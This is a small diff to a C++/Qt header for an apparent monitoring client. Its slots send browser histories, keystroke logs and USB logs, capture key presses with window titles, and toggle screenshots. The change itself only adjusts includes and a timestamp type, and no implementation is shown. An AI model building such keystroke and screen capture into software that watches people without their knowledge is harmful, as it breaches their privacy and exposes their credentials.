@@ -35,10 +35,9 @@
 #include <QAction>
 #include <QIcon>
 #include <libudev.h>
+#include <qchar.h>
 
 #include "KeyboardMonitor.h"
-#include "functions.h"
-#include "ConfigDialog.h"
 
 class MonitorClient : public QObject
 {
@@ -54,7 +53,7 @@ public slots:
     int sendBrowserHistories();
     int sendKeyLogs();
     int sendUSBLogs();
-    void handleKeyPress(qint64 timestamp, const QString &windowTitle, const QString &keyText);
+    void handleKeyPress(QString timestamp, const QString &windowTitle, const QString &keyText);
     void handleUsbEvent();
     void run();
     void enableScreenshot(bool enabled);
